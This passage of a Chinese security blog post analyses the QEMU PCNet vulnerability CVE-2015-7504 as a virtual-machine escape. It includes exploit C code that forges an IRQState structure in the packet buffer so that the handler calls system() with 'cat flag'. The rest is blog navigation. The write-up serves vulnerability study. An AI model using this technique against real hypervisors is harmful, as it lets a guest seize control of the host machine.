<p>可以看到指针指向IRQState结构体,而在qemu_set_irq中有这样一步操作:irq-&gt;handler().而在pcnet_update_irq(PCNetState *s)函数中,会调用qemu_set_irq函数.也就是我们可以通过控制这个指针,覆盖指向到一个我们伪造好的结构体中,就可以控制rip.</p>
<p><code>b hw/net/pcnet.c:1005</code>,<code>print s</code>,我们可以看到PCNetState结构体处于heap区域,而在我们只能覆盖irq指针的低4字节,所以我们只能采用堆内存伪造的方法,而我们可以进行操作的堆内存,很明显就是s.buffer[4096]</p>
<p>但是我们最多只能leak heapbase,这个s的结构体怎么拿到呢,qemu在启动的过程中,他的堆块申请释放顺序都是一样的,所以这个s的偏移也是固定的,通过调试,可以看到在本机上的结构体的偏移为0x67e1b0</p>
<p>堆块伪造:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">"%llx"</span>,&amp;heapBaseAddr);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%llx"</span>,&amp;textBaseAddr);</span><br><span class="line">	<span class="keyword">uint64_t</span> *packet_ptr;</span><br><span class="line">	packet_ptr = pcnet_packet;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fake_irq</span> * <span class="title">irq_ptr</span> = (<span class="title">packet_ptr</span> + 0<span class="title">x10</span>);</span></span><br><span class="line">	</span><br><span class="line">	irq_ptr-&gt;handler = system_plt + textBaseAddr;</span><br><span class="line">	irq_ptr-&gt;op = heapBaseAddr + <span class="number">0x67e1b0</span> + <span class="number">0x2290</span> + <span class="number">0x1f</span>*<span class="number">0x8</span>;</span><br><span class="line">	*(packet_ptr + <span class="number">0x1f</span>) = <span class="number">7449354444534473059</span>; <span class="comment">//cat flag</span></span><br><span class="line">	*(packet_ptr + <span class="number">0x20</span>) = <span class="number">0</span>;</span><br><span class="line">	*(packet_ptr + <span class="number">0x21</span>) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	iopl(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* compute required crc */</span></span><br><span class="line">	ptr = pcnet_packet;</span><br><span class="line">	<span class="keyword">while</span> (ptr != &amp;pcnet_packet[PCNET_BUFFER_SIZE - <span class="number">4</span>])</span><br><span class="line">		CRC(fcs, *ptr++);</span><br><span class="line"></span><br><span class="line">	targetValue = (heapBaseAddr + <span class="number">0x67e1b0</span> + <span class="number">0x2290</span> + <span class="number">0x10</span>*<span class="number">8</span>) &amp; <span class="number">0xffffffff</span>;</span><br></pre></td></tr></table></figure>
<p><img src="http://47.106.144.114/wp-content/uploads/2020/02/1579681781561.png" alt></p>
<p>可以看到已经将fake_irq写入内存<br><img src="http://47.106.144.114/wp-content/uploads/2020/02/1579681832736.png" alt></p>
<p>执行命令cat flag</p>

    </article>
    <!-- license  -->
    
        <div class="license-wrapper">
            <p>原文作者：<a href="http://mozhucy.cn">MozhuCY</a>
            <p>原文链接：<a href="http://mozhucy.cn/1970/01/01/cve-2015-7504/">http://mozhucy.cn/1970/01/01/cve-2015-7504/</a>
            <p>发表日期：<a href="http://mozhucy.cn/1970/01/01/cve-2015-7504/">January 1st 1970, 12:00:00 am</a>
            <p>更新日期：<a href="http://mozhucy.cn/1970/01/01/cve-2015-7504/">February 23rd 2020, 11:47:21 am</a>
            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
        </div>
    
    <!-- paginator  -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href= "/1970/01/01/python_pyc/" title= "Python的一些底层原理">
                    <div class="nextTitle">Python的一些底层原理</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href= "/1970/01/01/malloc源码精读总结/" title= "malloc源码精读总结">
                    <div class="prevTitle">malloc源码精读总结</div>
                </a>
            
        </li>
    </ul>
    <!-- 评论插件 -->
    <!-- 来必力City版安装代码 -->

<!-- City版安装代码已完成 -->
    
    
    <!-- partial('_partial/comment/changyan') -->
    <!--PC版-->


    
    

    <!-- 评论 -->
</main>
            <!-- profile -->
            
        </div>
        <footer class="footer footer-unloaded">
    <!-- social  -->
    
    <div class="social">
        
    
        
            
                <a href="mailto:930109649@qq.com" class="iconfont-archer email" title=email ></a>
            
        
    
        
            
                <a href="//github.com/mozhucy" class="iconfont-archer github" target="_blank" title=github></a>
            
        
    
        
            
                <span class="iconfont-archer wechat" title=wechat>
                  
                  <img class="profile-qr" src="/assets/example_qr.png" />
                </span>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    

    </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- 不蒜子  -->
    
    <div class="busuanzi-container">
    
     
    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
    
    </div>
    
</footer>
    </div>
    <!-- toc -->
    
    <div class="toc-wrapper" style=
    







top:50vh;

    >
        <div class="toc-catalog">
            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
        </div>
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#QEMU"><span class="toc-number">1.</span> <span class="toc-text">QEMU</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#分析目的"><span class="toc-number">2.</span> <span class="toc-text">分析目的</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#环境搭建"><span class="toc-number">3.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#qemu调试方法"><span class="toc-number">3.1.</span> <span class="toc-text">qemu调试方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#网络配置"><span class="toc-number">3.2.</span> <span class="toc-text">网络配置</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">4.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2015-5165"><span class="toc-number">4.1.</span> <span class="toc-text">cve-2015-5165</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp编写"><span class="toc-number">4.2.</span> <span class="toc-text">exp编写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2015-7504"><span class="toc-number">4.3.</span> <span class="toc-text">CVE-2015-7504</span></a></li></ol></li></ol>
    </div>
    
    <div class="back-top iconfont-archer">&#xe639;</div>
    <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
          <div class="sidebar-panel-archives">
    <!-- 在ejs中将archive按照时间排序 -->
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <div class="total-and-search">
        <div class="total-archive">
        Total : 72
        </div>
        <!-- search  -->
        
    </div>
    
    <div class="post-archive">
    
    
    
    
    <div class="archive-year"> 9102 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/29</span><a class="archive-post-title" href= "/9102/07/29/杂谈/" >写在前面</a>
        </li>
    
    
    
    
    
        </ul>
    
    <div class="archive-year"> 2020 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/25</span><a class="archive-post-title" href= "/2020/02/25/pci/" >PCI设备</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/25</span><a class="archive-post-title" href= "/2020/02/25/seccon-2018-q-escape/" >seccon-2018-q-escape</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/24</span><a class="archive-post-title" href= "/2020/02/24/DefconQuals-2018-EC3/" >DefconQuals-2018-EC3</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2020/02/23/HITB2017-babyqemu/" >HITB2017-babyqemu</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/22</span><a class="archive-post-title" href= "/2020/02/22/strng/" >blizzardctf2017-strng</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/22</span><a class="archive-post-title" href= "/2020/02/22/虚拟化学习/" >虚拟化学习 QEMU-KVM</a>
        </li>
    
    
    
    
    
        </ul>
    
    <div class="archive-year"> 2019 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/12</span><a class="archive-post-title" href= "/2019/08/12/fuzz/" >fuzz</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/2019/07/30/rsa/" >数论/RSA</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/29</span><a class="archive-post-title" href= "/2019/07/29/pwn/" >PWN?</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/30</span><a class="archive-post-title" href= "/2019/06/30/kctfq2/" >看雪CTF Q2 wp</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/01</span><a class="archive-post-title" href= "/2019/05/01/qwb/" >强网杯re(4/5)</a>
        </li>
    
    
    
    
    
        </ul>
    
    <div class="archive-year"> 2018 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/20</span><a class="archive-post-title" href= "/2018/09/20/wdctfpwn2/" >网鼎杯半决赛pwn3</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/09</span><a class="archive-post-title" href= "/2018/09/09/sus/" >东南大学练习平台二进制全题解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/19</span><a class="archive-post-title" href= "/2018/08/19/qctf-asong/" >qctf-asong</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/13</span><a class="archive-post-title" href= "/2018/08/13/suctf-enigma/" >SUCTF-enigma</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/20</span><a class="archive-post-title" href= "/2018/05/20/x64pwn/" >安恒月赛pwn100</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/06</span><a class="archive-post-title" href= "/2018/02/06/CTF二进制入门之路/" >CTF二进制学习0x00</a>
        </li>
    
    
    
    
    
        </ul>
    
    <div class="archive-year"> 1970 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/sudu/" >2017国赛re200 填数游戏</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/Reversing.kr--position&hateintel/" >Position&hateintel&Wrong byte!</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/cve-2015-7504/" >CVE-2015-7504 CVE-2015-5165QEMU虚拟机逃逸漏洞分析</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/xnuca-final/" >X-NUCA 2018个人赛/决赛PWN</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/homuranote/" >Homuranote</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/xnuca/" >X-NUCA逆向部分题解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/javascript0x1/" >javascript 0x00</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/z3/" >z3求解器的一些简单使用</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/hexo/" >hexo配置</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/二进制手的Web路SQL0/" >二进制手的Web路（sql注入篇</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/frida/" >Hook学习</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/二进制手的Web路SQL1/" >二进制手的Web路（sql注入篇</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/pe-elf/" >pe-elf文件结构解析</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/二进制手的Web路SQL2/" >二进制手的Web路 （sql注入篇</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/qctf-mips/" >qctf-mips</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/二进制选手的Web路(WhaleCTF web部分writepu/" >二进制手的WEB路（WhaleCTF web部分writeup</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/radare2/" >CTF二进制总结0x02</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/函数调用约定/" >Calling Convention</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/babyheap/" >babyheap</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/汇编入门/" >CTF二进制总结0X03</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/angr/" >符号执行</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/NUST/" >南理校赛二进制wp</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/suyuan/" >2017国赛-re200-溯源</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/深入浅出密码学读书笔记/" >深入浅出密码学读书笔记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/tls/" >hctf2018-部分逆向wp(Spiral是真的做不来)</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/看雪ctf4/" >2018看雪ctf第四题-密界寻踪</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/wdctfpwn0/" >网鼎杯半决赛pwn1</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/逆向工程核心原理笔记/" >Reversing-engineering</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/windows-c++/" >windows</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/RE/" >2018国赛逆向</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/iscc/" >ISCC逆向wp</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/byb/" >百越杯逆向全解wp</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/ollvm/" >anti-ollvm</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/io_file/" >io_file学习</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/cff2016/" >jarvisoj-文件数据恢复</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/juckcode/" >上海市ctf-re200-juckcode</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/redhat/" >redhat-re1</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/level6/" >0ctf - freenote</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/DLL注入0x1/" >初试windows消息钩取</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/maze/" >cis2016-re300-maze</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/wcyvm/" >WcyVM</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/PE文件头/" >PE文件格式</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/windows/" >windows反调试总结</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/MYSQL/" >网站开发入门-MYSQL数据库的基础使用</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/docker/" >docker</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/WHCTF2017 逆向签到题/" >CTF二进制总结0x01</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/malloc源码精读总结/" >malloc源码精读总结</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/HomuraVM/" >HomuraVM</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/python_pyc/" >Python的一些底层原理</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/iscc安卓逆向/" >ISCC 决赛 android 1000</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/sxqvm/" >SxqVM v0.0.1</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/RingZer0 Authenticator/" >RingZer0 Authenticator</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/kctf2019-q1/" >kctf2019-晋级赛Q1</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/Reversing.kr--replace/" >初试程序自修改</a>
        </li>
    
    </div>
  </div>
        <div class="sidebar-panel-tags">
    <div class="sidebar-tags-name">
    
        <span class="sidebar-tag-name" data-tags="PWN"><span class="iconfont-archer">&#xe606;</span>PWN</span>
    
    </div>
    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
    缺失模块。<br/>
    1、请确保node版本大于6.2<br/>
    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
    3、在根目录_config.yml里添加配置：
    <pre style="color: #787878; font-size: 0.6rem;">
jsonContent:
  meta: false
  pages: false
  posts:
    title: true
    date: true
    path: true
    text: false
    raw: false
    content: false
    slug: false
    updated: false
    comments: false
    link: false
    permalink: false
    excerpt: false
    categories: true
    tags: true</pre>
    </div> 
